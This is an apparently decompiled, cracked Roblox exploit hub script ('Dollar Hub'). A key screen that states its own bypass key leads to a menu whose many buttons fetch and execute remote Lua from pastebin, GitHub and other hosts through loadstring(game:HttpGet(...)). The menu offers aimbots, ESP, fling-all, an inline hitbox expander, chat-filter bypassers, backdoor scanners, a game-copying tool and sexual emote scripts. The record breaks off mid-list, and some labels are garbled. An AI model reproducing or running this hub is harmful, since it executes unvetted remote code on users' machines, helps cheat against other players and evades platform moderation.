-- filename: dollarhub.lua
-- version: rlua (robloxlua)
-- line: [0, 0] id: 0
-- cracked by purplessstrat
local r0_0 = Instance.new("ScreenGui")
local r1_0 = Instance.new("Frame")
local r2_0 = Instance.new("TextLabel")
local r3_0 = Instance.new("UICorner")
local r4_0 = Instance.new("UICorner")
local r5_0 = Instance.new("TextBox")
local r6_0 = Instance.new("UICorner")
local r7_0 = Instance.new("TextButton")
local r8_0 = Instance.new("UICorner")
local r9_0 = Instance.new("TextLabel")
local r10_0 = Instance.new("UICorner")
local r11_0 = Instance.new("TextButton")
local r12_0 = Instance.new("UICorner")
r0_0.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
r0_0.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
r1_0.Parent = r0_0
r1_0.AnchorPoint = Vector2.new(0.5, 0.5)
r1_0.BackgroundColor3 = Color3.new(0.0509804, 0.0509804, 0.0509804)
r1_0.BorderColor3 = Color3.new(0, 0, 0)
r1_0.BorderSizePixel = 0
r1_0.Position = UDim2.new(0.5, 0, 0.5, 0)
r1_0.Size = UDim2.new(0, 500, 0, 300)
r2_0.Parent = r1_0
r2_0.BackgroundColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
r2_0.BorderColor3 = Color3.new(0, 0, 0)
r2_0.BorderSizePixel = 0
r2_0.Size = UDim2.new(0, 500, 0, 50)
r2_0.Font = Enum.Font.FredokaOne
r2_0.Text = "Key System"
r2_0.TextColor3 = Color3.new(1, 1, 1)
r2_0.TextScaled = true
r2_0.TextSize = 14
r2_0.TextWrapped = true
r3_0.Parent = r2_0
r4_0.Parent = r1_0
r4_0.CornerRadius = UDim.new(0, 5)
r5_0.Parent = r1_0
r5_0.AnchorPoint = Vector2.new(0.5, 0.5)
r5_0.BackgroundColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
r5_0.BorderColor3 = Color3.new(0, 0, 0)
r5_0.BorderSizePixel = 0
r5_0.Position = UDim2.new(0.5, 0, 0.5, 0)
r5_0.Size = UDim2.new(0, 200, 0, 50)
r5_0.Font = Enum.Font.FredokaOne
r5_0.PlaceholderColor3 = Color3.new(1, 1, 1)
r5_0.PlaceholderText = "Your Key"
r5_0.Text = ""
r5_0.TextColor3 = Color3.new(1, 1, 1)
r5_0.TextScaled = true
r5_0.TextSize = 14
r5_0.TextWrapped = true
r6_0.Parent = r5_0
r7_0.Parent = r1_0
r7_0.AnchorPoint = Vector2.new(0.5, 0.5)
r7_0.BackgroundColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
r7_0.BorderColor3 = Color3.new(0, 0, 0)
r7_0.BorderSizePixel = 0
r7_0.Position = UDim2.new(0.5, 0, 0.730000019, 0)
r7_0.Size = UDim2.new(0, 200, 0, 50)
r7_0.Font = Enum.Font.FredokaOne
r7_0.Text = "Submit"
r7_0.TextColor3 = Color3.new(1, 1, 1)
r7_0.TextScaled = true
r7_0.TextSize = 14
r7_0.TextWrapped = true
r8_0.Parent = r7_0
r9_0.Parent = r1_0
r9_0.BackgroundColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
r9_0.BorderColor3 = Color3.new(0, 0, 0)
r9_0.BorderSizePixel = 0
r9_0.Position = UDim2.new(0.0120000001, 0, 0.166666672, 0)
r9_0.Size = UDim2.new(0, 488, 0, 23)
r9_0.Font = Enum.Font.FredokaOne
r9_0.Text = "This script was cracked by PurplesStrat. The key is psrblx"
r9_0.TextColor3 = Color3.new(1, 1, 1)
r9_0.TextScaled = true
r9_0.TextSize = 14
r9_0.TextWrapped = true
r10_0.Parent = r9_0
r11_0.Name = "get"
r11_0.Parent = r1_0
r11_0.AnchorPoint = Vector2.new(0.5, 0.5)
r11_0.BackgroundColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
r11_0.BorderColor3 = Color3.new(0, 0, 0)
r11_0.BorderSizePixel = 0
r11_0.Position = UDim2.new(0.5, 0, 0.896666646, 0)
r11_0.Size = UDim2.new(0, 200, 0, 50)
r11_0.Font = Enum.Font.FredokaOne
r11_0.Text = "Get key"
r11_0.TextColor3 = Color3.new(1, 1, 1)
r11_0.TextScaled = true
r11_0.TextSize = 14
r11_0.TextWrapped = true
r12_0.Parent = r11_0
coroutine.wrap(function()
  -- line: [0, 0] id: 3
  local r0_3 = Instance.new("LocalScript", r1_0)
  local r1_3 = Instance.new("BlurEffect")
  r1_3.Parent = game.Lighting
  r1_3.Size = 13
  local r2_3 = r0_3.Parent.TextBox
  r0_3.Parent.TextButton.MouseButton1Click:Connect(function()
    -- line: [0, 0] id: 4
    if r2_3.Text == "psrblx" then
      r1_3:Destroy()
      r0_0:Destroy()
      getgenv().gethui = function()
        -- line: [0, 0] id: 575
        return game.CoreGui
      end
      local r0_4 = loadstring(game:HttpGet("https://raw.githubusercontent.com/TimShadow1/dollarhub/refs/heads/main/orionlib.lua"))()
      local r1_4 = game:GetService("HttpService")
      local r2_4 = game:GetService("Players")
      local r3_4 = game:GetService("MarketplaceService")
      local r4_4 = r0_4:MakeWindow({
        Name = "Dollar Hub - Cracked by PurplesStrat\u{e000}",
        HidePremium = false,
        SaveConfig = false,
        ConfigFolder = "SHUB",
      })
      r0_4:MakeNotification({
        Name = "$ Hub",
        Content = "This script ha loaded. Cracked by PurplesStrat",
        Image = "rbxassetid://7734059095",
        Time = 10,
      })
      local r5_4 = r4_4:MakeTab({
        Name = "Home",
        Icon = "rbxassetid://7733960981",
        PremiumOnly = false,
      })
      r5_4:AddButton({
        Name = "All Supported Games (Click F9 For Open Console\nOr Type In Chat /console)",
        Callback = function()
          -- line: [0, 0] id: 258
          loadstring(game:HttpGet("https://pastebin.com/raw/YF2xEfHj"))()
        end,
      })
      r5_4:AddLabel("Hello! Thank you for using my hub)")
      r5_4:AddLabel("You are so cool because u using my script!")
      r5_4:AddLabel("Show this script to your friends or make me a video and send in my dms in discord you will get free 2010 account")
      r5_4:AddButton({
        Name = "Discord Server (click to copy)",
        Callback = function()
          -- line: [0, 0] id: 526
          setclipboard("https://discord.gg/guwwnSRn53")
        end,
      })
      r4_4:MakeTab({
        Name = "Hub Settings",
        Icon = "rbxassetid://7734053495",
        PremiumOnly = false,
      }):AddButton({
        Name = "ï¿½Ð°ÐºÑÑÑÑ Ð¿Ð¾Ð»Ð½Ð¾ÑÑÑÑ ÑÐ°Ð±? \nClose the hub completely?",
        Callback = function()
          -- line: [0, 0] id: 292
          r0_4:Destroy()
        end,
      })
      local r7_4 = r4_4:MakeTab({
        Name = "Universal/FE",
        Icon = "rbxassetid://3610245066",
        PremiumOnly = false,
      })
      local r8_4 = r7_4:AddSection({
        Name = "FE Scripts",
      })
      r7_4:AddButton({
        Name = "FE Trolling GUI",
        Callback = function()
          -- line: [0, 0] id: 192
          loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/FE%20Trolling%20GUI.luau"))()
        end,
      })
      r7_4:AddButton({
        Name = "Lear Hub",
        Callback = function()
          -- line: [0, 0] id: 314
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Emircxy/Lear/refs/heads/main/Animation"))()
        end,
      })
      r7_4:AddButton({
        Name = "FE R15 Animations",
        Callback = function()
          -- line: [0, 0] id: 681
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploitFin/AquaMatrix/refs/heads/AquaMatrix/AquaMatrix"))()
        end,
      })
      r7_4:AddButton({
        Name = "FE R6/R15 Animations GUI",
        Callback = function()
          -- line: [0, 0] id: 636
          loadstring(game:HttpGet("https://binfor.do.am/Scripts/energize.html"))()
        end,
      })
      r7_4:AddButton({
        Name = "FE Invisible - ÑÑÐ°ÑÑ Ð½ÐµÐ²Ð¸Ð´Ð¸Ð¼ÑÐ¼",
        Callback = function()
          -- line: [0, 0] id: 729
          loadstring(game:HttpGet("https://pastebin.com/raw/3Rnd9rHf"))()
        end,
      })
      r7_4:AddButton({
        Name = "FE Equip All Tools",
        Callback = function()
          -- line: [0, 0] id: 768
          loadstring(game:HttpGet("https://pastefy.app/IKblkV2x/raw"))()
        end,
      })
      r7_4:AddButton({
        Name = "FE Ball Script (R6 & R15)",
        Callback = function()
          -- line: [0, 0] id: 315
          loadstring(game:HttpGet("https://pastebin.com/raw/BZr9bGDy", true))()
        end,
      })
      r7_4:AddButton({
        Name = "FE Animations GUI (R6)",
        Callback = function()
          -- line: [0, 0] id: 440
          loadstring(game:HttpGet("https://gist.githubusercontent.com/MelonsStuff/f018928d2f010789a150b4924e279b16/raw/8de399eb9cbccbde430fcd37270cd4ff171f8b8e/AnimationGUI.txt"))()
        end,
      })
      r7_4:AddButton({
        Name = "FE Jerk Off (R6)",
        Callback = function()
          -- line: [0, 0] id: 743
          loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))()
        end,
      })
      r7_4:AddButton({
        Name = "FE Freaky Script (R6)",
        Callback = function()
          -- line: [0, 0] id: 251
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ShutUpJamesTheLoser/freakyv94/refs/heads/main/freakyv94yes", true))()
        end,
      })
      r7_4:AddButton({
        Name = "FE Seraphic Blade (R6)",
        Callback = function()
          -- line: [0, 0] id: 653
          loadstring(game:HttpGet("https://pastefy.app/59mJGQGe/raw"))()
        end,
      })
      r7_4:AddButton({
        Name = "FE Sus Hub",
        Callback = function()
          -- line: [0, 0] id: 215
          loadstring(game:HttpGet("https://raw.githubusercontent.com/cnPthPiGon/RamDRuomFirirueieiid8didj/refs/heads/main/Fe%20sus%20hub"))()
        end,
      })
      r7_4:AddButton({
        Name = "FE Fake Lag (R6 & R15)",
        Callback = function()
          -- line: [0, 0] id: 476
          loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FAKE-LAG-22520"))()
        end,
      })
      r7_4:AddButton({
        Name = "FE Player Fucker (R6 & R15)",
        Callback = function()
          -- line: [0, 0] id: 220
          loadstring(game:HttpGet("https://raw.githubusercontent.com/SpiderScriptRB/Script-SPT/refs/heads/main/Fuck%20Player%20%40SpiderScriptRB.txt"))()
        end,
      })
      r7_4:AddButton({
        Name = "FE Fling Sniper",
        Callback = function()
          -- line: [0, 0] id: 276
          loadstring(game:HttpGet("https://raw.githubusercontent.com/MavaaQ/tichoucko/refs/heads/main/fl.lua"))()
        end,
      })
      r7_4:AddButton({
        Name = "FE SCP-096 (R6)",
        Callback = function()
          -- line: [0, 0] id: 385
          loadstring(game:HttpGet("https://pastefy.app/M25RnnGm/raw"))()
        end,
      })
      r7_4:AddButton({
        Name = "FE Jump Animation (R6)",
        Callback = function()
          -- line: [0, 0] id: 568
          loadstring(game:HttpGet("https://raw.githubusercontent.com/SpiderScriptRB/Jump-Animation/refs/heads/main/Only%20R6%20Animation.txt"))()
        end,
      })
      r7_4:AddButton({
        Name = "FE Drift (R6)",
        Callback = function()
          -- line: [0, 0] id: 495
          loadstring(game:HttpGet("https://raw.githubusercontent.com/SpiderScriptRB/Sta1kerH1ck/refs/heads/main/R6Drift.txt"))()
        end,
      })
      r7_4:AddButton({
        Name = "FE Dance Tool (R6)",
        Callback = function()
          -- line: [0, 0] id: 66
          loadstring(game:HttpGet("https://gist.githubusercontent.com/ocfi/a9eebe4bffd19014263551ba10c50f3e/raw/359e6e6cfe7d0ee34304cbc50b14a34d54405db0/Wait%2520They%2520Dont%2520Love%2520You%2520Like%2520I%2520Love%2520You%2520Animation%2520Emote.lua"))()
        end,
      })
      r7_4:AddButton({
        Name = "FE Submerge Script (R6 & R15)",
        Callback = function()
          -- line: [0, 0] id: 706
          loadstring(game:HttpGet("https://pastebin.com/raw/gV77bURr"))()
        end,
      })
      r7_4:AddButton({
        Name = "FE Ragdoll Character (R6)",
        Callback = function()
          -- line: [0, 0] id: 728
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Kovryab/Ragdoll/refs/heads/main/Menu"))()
        end,
      })
      r7_4:AddButton({
        Name = "FE Saitama (R6)",
        Callback = function()
          -- line: [0, 0] id: 555
          loadstring(game:HttpGet("https://pastebin.com/raw/5K1jpZs6", true))()
        end,
      })
      r7_4:AddButton({
        Name = "FE Front Flip Anywhere (R6)",
        Callback = function()
          -- line: [0, 0] id: 55
          loadstring(game:HttpGet("https://raw.githubusercontent.com/SHRTRYScriptMANhere/stolenahhfrotflip/refs/heads/main/Flip", true))()
        end,
      })
      r7_4:AddButton({
        Name = "FE Zombie Animation (R15)",
        Callback = function()
          -- line: [0, 0] id: 112
          loadstring(game:HttpGet("https://pastebin.com/raw/5w7Jh6Yv", true))()
        end,
      })
      r7_4:AddButton({
        Name = "FE Chat Draw",
        Callback = function()
          -- line: [0, 0] id: 715
          loadstring(game:HttpGet("https://raw.githubusercontent.com/AKadminlol/Chatdraw/refs/heads/main/Chattdraw"))()
        end,
      })
      r7_4:AddButton({
        Name = "FE Super Ring Parts",
        Callback = function()
          -- line: [0, 0] id: 430
          loadstring(game:HttpGet("https://raw.githubusercontent.com/cnPthPiGon/CM9/refs/heads/main/Super%20Ring%20Part%20V3%20Real%20FE%20Leak%20Finally"))()
        end,
      })
      r7_4:AddButton({
        Name = "FE Disable Gravity For Non-Fixed Objects",
        Callback = function()
          -- line: [0, 0] id: 383
          loadstring(game:HttpGet("https://raw.githubusercontent.com/SpiderScriptRB/FE-Lifting-objects/refs/heads/main/objects%20up.txt"))()
        end,
      })
      r7_4:AddButton({
        Name = "FE Tool Giver",
        Callback = function()
          -- line: [0, 0] id: 301
          loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Game-tool-giver-12133"))()
        end,
      })
      r7_4:AddButton({
        Name = "FE Reverse Time",
        Callback = function()
          -- line: [0, 0] id: 434
          loadstring(game:HttpGet("https://raw.githubusercontent.com/AKadminlol/ReversebyAK/refs/heads/main/holdCtoReverse"))()
        end,
      })
      r7_4:AddButton({
        Name = "FE Fling All",
        Callback = function()
          -- line: [0, 0] id: 313
          loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
        end,
      })
      r7_4:AddButton({
        Name = "FE Jason Spy",
        Callback = function()
          -- line: [0, 0] id: 735
          loadstring(game:HttpGet("https://pastebin.com/raw/q6kUz9vv"))()
        end,
      })
      local r9_4 = r7_4:AddSection({
        Name = "Admin Scripts",
      })
      r7_4:AddButton({
        Name = "QuirkyCMD (Doesn\'t work in all games)",
        Callback = function()
          -- line: [0, 0] id: 736
          loadstring(game:HttpGet("https://gist.github.com/someunknowndude/38cecea5be9d75cb743eac8b1eaf6758/raw"))()
        end,
      })
      r7_4:AddButton({
        Name = "Infinite Yield",
        Callback = function()
          -- line: [0, 0] id: 387
          loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
        end,
      })
      r7_4:AddButton({
        Name = "Orca",
        Callback = function()
          -- line: [0, 0] id: 322
          loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/richie0866/orca/master/public/snapshot.lua"))()
        end,
      })
      r7_4:AddButton({
        Name = "Nameless Admin",
        Callback = function()
          -- line: [0, 0] id: 121
          loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()
        end,
      })
      r7_4:AddButton({
        Name = "Reviz Admin",
        Callback = function()
          -- line: [0, 0] id: 19
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Pa1ntex/reviz-admin-v2-script-FE/refs/heads/main/Reviz%20admin%20v2%20FE"))()
        end,
      })
      r7_4:AddButton({
        Name = "Proton Admin (Click on ; to open CMD Bar)",
        Callback = function()
          -- line: [0, 0] id: 648
          _G.UI_Id = "default"
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/5e6e6cc1bb32fd926764d064e2c60a3b.lua"))()
        end,
      })
      local r10_4 = r7_4:AddSection({
        Name = "Chat Bypass Scripts",
      })
      r7_4:AddButton({
        Name = "f0g0tt Bypasser",
        Callback = function()
          -- line: [0, 0] id: 588
          loadstring(game:HttpGet("https://raw.githubusercontent.com/FOGOTY/bypasschat/refs/heads/main/script"))()
        end,
      })
      r7_4:AddButton({
        Name = "Better Bypasser",
        Callback = function()
          -- line: [0, 0] id: 253
          loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Synergy-Networks/products/main/BetterBypasser/loader.lua"))()
        end,
      })
      r7_4:AddButton({
        Name = "Anna Bypasser (Change the language to ÐÐ°Ð·Ð°Ðº Ð¢Ð¸Ð»Ð¸)",
        Callback = function()
          -- line: [0, 0] id: 612
          loadstring(game:HttpGet("https://raw.githubusercontent.com/AnnaRoblox/AnnaBypasser/refs/heads/main/AnnaBypasser.lua", true))()
        end,
      })
      local r11_4 = r7_4:AddSection({
        Name = "Universal Scripts",
      })
      r7_4:AddButton({
        Name = "Wisl\'i Universal Project",
        Callback = function()
          -- line: [0, 0] id: 193
          loadstring(game:HttpGet("https://raw.githubusercontent.com/wisl884/wisl-i-Universal-Project1/main/Wisl\'i%20Universal%20Project.lua", true))()
        end,
      })
      r7_4:AddButton({
        Name = "Piano Autoplayer",
        Callback = function()
          -- line: [0, 0] id: 302
          pcall(function()
            -- line: [0, 0] id: 303
            loadstring(game:HttpGet("https://raw.githubusercontent.com/hellohellohell012321/TALENTLESS/main/TALENTLESS", true))()
          end)
        end,
      })
      r7_4:AddButton({
        Name = "Open Aimbot (Best Aimbot)",
        Callback = function()
          -- line: [0, 0] id: 694
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ttwizz/Open-Aimbot/master/source.lua", true))()
        end,
      })
      r7_4:AddButton({
        Name = "Mobile Aimbot",
        Callback = function()
          -- line: [0, 0] id: 423
          loadstring(game:HttpGet("https://raw.githubusercontent.com/DanielHubll/DanielHubll/refs/heads/main/Aimbot%20Mobile"))()
        end,
      })
      r7_4:AddButton({
        Name = "Quiz Bot",
        Callback = function()
          -- line: [0, 0] id: 147
          local r0_147 = loadstring(game:HttpGet("https://raw.githubusercontent.com/Damian-11/quizbot/master/quizbot.luau"))()
        end,
      })
      r7_4:AddButton({
        Name = "ChatBot Hub",
        Callback = function()
          -- line: [0, 0] id: 212
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Guerric9018/chatbothub/main/ChatbotHub.lua"))()
        end,
      })
      r7_4:AddButton({
        Name = "Stream Sniper",
        Callback = function()
          -- line: [0, 0] id: 415
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Guest3D/ZirconHub/refs/heads/main/StreamSniper.lua"))()
        end,
      })
      r7_4:AddButton({
        Name = "Universal Dance GUI",
        Callback = function()
          -- line: [0, 0] id: 280
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ocfi/aqua-hub-is-a-skid-lol/refs/heads/main/animatrix"))()
        end,
      })
      r7_4:AddButton({
        Name = "Animation Logger",
        Callback = function()
          -- line: [0, 0] id: 232
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Mautiku/ehh/main/sussy\'s%20animation%20logger.txt", true))()
        end,
      })
      r7_4:AddButton({
        Name = "Jokes GUI",
        Callback = function()
          -- line: [0, 0] id: 524
          loadstring(game:HttpGet("https://raw.githubusercontent.com/RealBatu20/AI-Scripts-2025/refs/heads/main/JokesGUI(SAFE).lua", true))()
        end,
      })
      r7_4:AddButton({
        Name = "Universal Syn SaveInstance (Copying The Game)",
        Callback = function()
          -- line: [0, 0] id: 346
          loadstring(game:HttpGet("https://raw.githubusercontent.com/24rr/tmpignore/refs/heads/main/32423sadf133"))()
        end,
      })
      r7_4:AddButton({
        Name = "Executor Checker Panel (Press F9 when you run the tests)",
        Callback = function()
          -- line: [0, 0] id: 391
          loadstring(game:HttpGet("https://raw.githubusercontent.com/RealBatu20/AI-Scripts-2025/refs/heads/main/ExecutorTestsPanel.lua"))()
        end,
      })
      r7_4:AddButton({
        Name = "Anti-AFK",
        Callback = function()
          -- line: [0, 0] id: 304
          loadstring(game:HttpGet("https://pastebin.com/raw/VY8tTPhr"))()
        end,
      })
      r7_4:AddButton({
        Name = "Free Camera (Shift + P to enable)",
        Callback = function()
          -- line: [0, 0] id: 406
          loadstring(game:HttpGet("https://zxfolix.github.io/freecamV2.txt"))()
        end,
      })
      r7_4:AddButton({
        Name = "Hitbox Expander",
        Callback = function()
          -- line: [0, 0] id: 101
          _G.HeadSize = 20
          _G.Disabled = true
          game:GetService("RunService").RenderStepped:connect(function()
            -- line: [0, 0] id: 102
            if _G.Disabled then
              local r0_102 = next
              local r1_102, r2_102 = game:GetService("Players"):GetPlayers()
              for r3_102, r4_102 in r0_102, r1_102, r2_102 do
                if r4_102.Name ~= game:GetService("Players").LocalPlayer.Name then
                  pcall(function()
                    -- line: [0, 0] id: 103
                    r4_102.Character.Head.Size = Vector3.new(_G.HeadSize, _G.HeadSize, _G.HeadSize)
                    r4_102.Character.Head.Transparency = 1
                    r4_102.Character.Head.BrickColor = BrickColor.new("Red")
                    r4_102.Character.Head.Material = "Neon"
                    r4_102.Character.Head.CanCollide = false
                    r4_102.Character.Head.Massless = true
                  end)
                end
                -- close: r3_102
              end
            end
          end)
        end,
      })
      r7_4:AddButton({
        Name = "Another Hitbox Expander",
        Callback = function()
          -- line: [0, 0] id: 627
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Aucor-Limited/Avtor/refs/heads/main/expander.lua"))()
        end,
      })
      r7_4:AddButton({
        Name = "PShade Ultimate (Shaders)",
        Callback = function()
          -- line: [0, 0] id: 763
          loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/pshade-ultimate/refs/heads/main/src/cd.lua"))()
        end,
      })
      r7_4:AddButton({
        Name = "DEX Explorer",
        Callback = function()
          -- line: [0, 0] id: 332
          loadstring(game:HttpGet("https://github.com/OfficiallyMelon/BetterDecompiler/raw/main/dex_betterdecompiler.lua"))()
        end,
      })
      r7_4:AddButton({
        Name = "Universal ESP",
        Callback = function()
          -- line: [0, 0] id: 118
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Lucasfin000/SpaceHub/main/UESP"))()
        end,
      })
      r7_4:AddButton({
        Name = "Universal Aimbot",
        Callback = function()
          -- line: [0, 0] id: 509
          loadstring(game:HttpGet("https://pastebin.com/raw/Vsk9u3qT"))()
        end,
      })
      r7_4:AddButton({
        Name = "Fly GUI",
        Callback = function()
          -- line: [0, 0] id: 286
          loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
        end,
      })
      r7_4:AddButton({
        Name = "FPS Boost",
        Callback = function()
          -- line: [0, 0] id: 549
          loadstring(game:HttpGet("https://pastebin.com/raw/8YZ2cc6V"))()
        end,
      })
      r7_4:AddButton({
        Name = "Fake Limited Items",
        Callback = function()
          -- line: [0, 0] id: 479
          loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/fakelimitedsv2/main/fakelimitedsv2", true))()
        end,
      })
      r7_4:AddButton({
        Name = "Infinite Jump",
        Callback = function()
          -- line: [0, 0] id: 190
          loadstring(game:HttpGet("https://pastebin.com/raw/97zaNrr1"))()
        end,
      })
      r7_4:AddButton({
        Name = "Zombie Animation",
        Callback = function()
          -- line: [0, 0] id: 493
          loadstring(game:HttpGet("https://pastebin.com/raw/9iJEPhLx"))()
        end,
      })
      r7_4:AddButton({
        Name = "ï¿½ÐºÑÐ°Ð½ 4:3 - 4:3 Resolution",
        Callback = function()
          -- line: [0, 0] id: 617
          loadstring(game:HttpGet("https://pastebin.com/raw/jSDEp8G1"))()
        end,
      })
      r7_4:AddButton({
        Name = "FOV Changer",
        Callback = function()
          -- line: [0, 0] id: 528
          loadstring(game:GetObjects("rbxassetid://15046298025")[1].Source)()
        end,
      })
      r7_4:AddButton({
        Name = "Free Animations",
        Callback = function()
          -- line: [0, 0] id: 40
          loadstring(game:HttpGet("https://pastefy.app/S7xNJSXX/raw"))()
          execute("Script9")
        end,
      })
      r7_4:AddButton({
        Name = "Universal Autoclicker",
        Callback = function()
          -- line: [0, 0] id: 161
          loadstring(game:HttpGetAsync("https://pastebin.com/raw/WgkcDYUs"))()
        end,
      })
      r7_4:AddButton({
        Name = "RGB Keystrokes UI",
        Callback = function()
          -- line: [0, 0] id: 336
          loadstring(game:HttpGet("https://pastebin.com/raw/bfMQkskC"))()
        end,
      })
      r7_4:AddButton({
        Name = "Sirius",
        Callback = function()
          -- line: [0, 0] id: 769
          loadstring(game:HttpGet("https://sirius.menu/sirius"))()
        end,
      })
      r7_4:AddButton({
        Name = "Teleport To Players",
        Callback = function()
          -- line: [0, 0] id: 749
          loadstring(game:HttpGet("https://raw.githubusercontent.com/khenn791/script-khen/refs/heads/main/TeleportPlayers", true))()
        end,
      })
      r7_4:AddButton({
        Name = "Copy Avatar (Visual)",
        Callback = function()
          -- line: [0, 0] id: 50
          loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostPlayer352/Test4/refs/heads/main/Copy%20Avatar"))()
        end,
      })
      r7_4:AddButton({
        Name = "Fake IP Grabber",
        Callback = function()
          -- line: [0, 0] id: 461
          loadstring(game:HttpGet("https://zxfolix.github.io/trollgrabber.lua"))()
        end,
      })
      r7_4:AddButton({
        Name = "ScriptBlox Searcher GUI",
        Callback = function()
          -- line: [0, 0] id: 632
          loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/ScriptSearcher"))()
        end,
      })
      r7_4:AddButton({
        Name = "Perfomance Monitor",
        Callback = function()
          -- line: [0, 0] id: 20
          loadstring(game:HttpGet("https://pastebin.com/raw/HxsPsHJd"))()
        end,
      })
      r7_4:AddButton({
        Name = "Only FPS Counter",
        Callback = function()
          -- line: [0, 0] id: 649
          loadstring(game:HttpGet("https://pastefy.app/c63s1M4w/raw", true))()
        end,
      })
      r7_4:AddButton({
        Name = "Portal Gun (Visual)",
        Callback = function()
          -- line: [0, 0] id: 435
          loadstring(game:HttpGet("https://raw.githubusercontent.com/randomguy194/dollar-tree-portal-gun/main/portal%20gun%20ported"))()
        end,
      })
      r7_4:AddButton({
        Name = "Express Hub",
        Callback = function()
          -- line: [0, 0] id: 466
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/d8824b23a4d9f2e0d62b4e69397d206b.lua"))()
        end,
      })
      r7_4:AddButton({
        Name = "Venox Webhook Tool",
        Callback = function()
          -- line: [0, 0] id: 356
          loadstring(game:HttpGet("https://raw.githubusercontent.com/venoxhh/universalscripts/main/webhook_tools"))()
        end,
      })
      r7_4:AddButton({
        Name = "Stare At People",
        Callback = function()
          -- line: [0, 0] id: 327
          loadstring(game:HttpGet("https://raw.githubusercontent.com/hassanxzayn-lua/NEOXHUBMAIN/refs/heads/main/stare"))()
        end,
      })
      local r12_4 = r7_4:AddSection({
        Name = "Backdoor Scaners",
      })
      r7_4:AddButton({
        Name = "LALOL Hub",
        Callback = function()
          -- line: [0, 0] id: 189
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script"))()
        end,
      })
      r7_4:AddButton({
        Name = "Ivan Protogen",
        Callback = function()
          -- line: [0, 0] id: 274
          loadstring(game:HttpGet("https://raw.githubusercontent.com/IvanTheProtogen/BackdoorLegacy/main/main.lua"))()
        end,
      })
      r7_4:AddSection({
        Name = "Executors",
      })
      r7_4:AddButton({
        Name = "Synapse X",
        Callback = function()
          -- line: [0, 0] id: 347
          loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/Chillz-s-scripts/main/Synapse-X-Remake.lua"))()
        end,
      })
      r7_4:AddButton({
        Name = "KRNL",
        Callback = function()
          -- line: [0, 0] id: 140
          loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/Chillz-s-scripts/refs/heads/main/KRNL%20UI%20Remake.lua"))()
        end,
      })
      r7_4:AddButton({
        Name = "Arceus X",
        Callback = function()
          -- line: [0, 0] id: 492
          loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20X%20V3"))()
        end,
      })
      r7_4:AddButton({
        Name = "Fluxus",
        Callback = function()
          -- line: [0, 0] id: 87
          loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Fluxus-Coral-Remake-7112"))()
        end,
      })
      r7_4:AddButton({
        Name = "Solara Internal",
        Callback = function()
          -- line: [0, 0] id: 67
          loadstring(game:HttpGet("https://raw.githubusercontent.com/InfernusScripts/Other-Stuff/main/ExecutorInternal.lua"))()
        end,
      })
      r7_4:AddButton({
        Name = "Delta Old",
        Callback = function()
          -- line: [0, 0] id: 644
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ElijahGamingRBLX/Roblox-Executor/8536d27eef4eca985572dc30fc146dfd4e55a893/DeltaExecutor.lua", true))()
        end,
      })
      r7_4:AddButton({
        Name = "Electron",
        Callback = function()
          -- line: [0, 0] id: 153
          loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Electron-UI-Remake-13807"))()
        end,
      })
      local r13_4 = r4_4:MakeTab({
        Name = "More Scripts",
        Icon = "rbxassetid://4483362748",
        PremiumOnly = false,
      })
      r13_4:AddButton({
        Name = "INK Game script",
        Callback = function()
          -- line: [0, 0] id: 722
          loadstring(game:HttpGet("https://raw.githubusercontent.com/lebumbum/leyield/refs/heads/main/inkgame"))()
        end,
      })
      r13_4:AddButton({
        Name = "Forsaken",
        Callback = function()
          -- line: [0, 0] id: 690
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Actualmrp/Frostware-forsaken/refs/heads/main/Forsaken"))()
        end,
      })
      r13_4:AddButton({
        Name = "1. +1 Slayer Blade - Lyzer Hub",
        Callback = function()
          -- line: [0, 0] id: 28
          loadstring(game:HttpGet("https://you.whimper.xyz/lyzer"))()
        end,
      })
      r13_4:AddButton({
        Name = "2. 100 Player Slippery Stairs - Aqua Hub",
        Callback = function()
          -- line: [0, 0] id: 723
